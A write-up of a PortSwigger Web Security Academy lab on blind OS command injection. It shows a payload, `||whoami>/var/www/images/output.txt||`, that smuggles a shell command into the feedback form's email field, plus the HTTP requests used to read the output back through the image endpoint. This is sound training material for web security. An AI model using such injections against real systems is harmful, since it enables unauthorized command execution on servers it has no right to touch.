# Blind OS command injection with output redirection

## Description

[This lab](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection) contains a blind OS command injection vulnerability in the feedback function. The application executes a shell command containing the user-supplied details. The output from the command is not returned in the response. However, you can use output redirection to capture the output from the command. There is a writable folder at:

    /var/www/images/

The application serves the images for the product catalog from this location. It is possible to redirect the output from the injected command to a file in this folder, and then use the image loading URL to retrieve the contents of the file. 

## Reproduction and proof of concept

1. Use Burp Suite to intercept and modify the request that submits feedback.
2. Modify the email parameter, changing it to: `email=||whoami>/var/www/images/output.txt||`

```text
POST /feedback/submit HTTP/1.1
Host: 0ad40078044cb583c02f95a200910010.web-security-academy.net

```

3. Now use Burp Suite to intercept and modify the request that loads an image of a product.
4. Modify the filename parameter, changing the value to the name of the file specified for the output of the injected command: `filename=output.txt`

```text
GET /image?filename=output.txt HTTP/1.1
Host: 0ad40078044cb583c02f95a200910010.web-security-academy.net
Cookie: session=dUa7zaWcifFtBvIhkwFb4n5GnkIqqMXn

Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: same-origin
Te: trailers
Connection: close
```

5. Observe that the response contains the output from the injected command.

## Exploitability

An attacker will need to execute the `whoami` command and retrieve the output.
